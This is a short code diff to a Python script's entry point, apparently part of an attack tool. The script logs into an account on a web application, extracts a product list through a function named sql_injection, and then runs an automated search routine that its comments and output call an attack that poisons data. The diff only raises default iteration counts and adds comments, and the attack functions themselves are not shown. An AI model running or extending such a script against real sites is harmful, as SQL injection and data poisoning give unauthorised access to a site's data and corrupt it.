@@ -37,15 +37,19 @@ if __name__ == '__main__':
     parser = argparse.ArgumentParser()
     parser.add_argument('--username', type=str, required=True, help='Specify existing username')
     parser.add_argument('--password', type=str, required=True, help='Specify existing username password')
-    parser.add_argument('--k_prod', type=int, default=1)
-    parser.add_argument('--n_times', type=int, default=1)
+    parser.add_argument('--k_prod', type=int, default=5)
+    parser.add_argument('--n_times', type=int, default=5)
     
     args = parser.parse_args()
-    
+
+    # Create session
     session = requests.Session()
+    # Loogin into account
     logged_in, session = attempt_login(args.username, args.password)
+    # Get product list
     products_list = sql_injection(session)
     print("List of products obtained!")
+    # Begin attack
     print("Poisoning data...")
     automatic_search(session, products_list, args.k_prod, args.n_times)
 
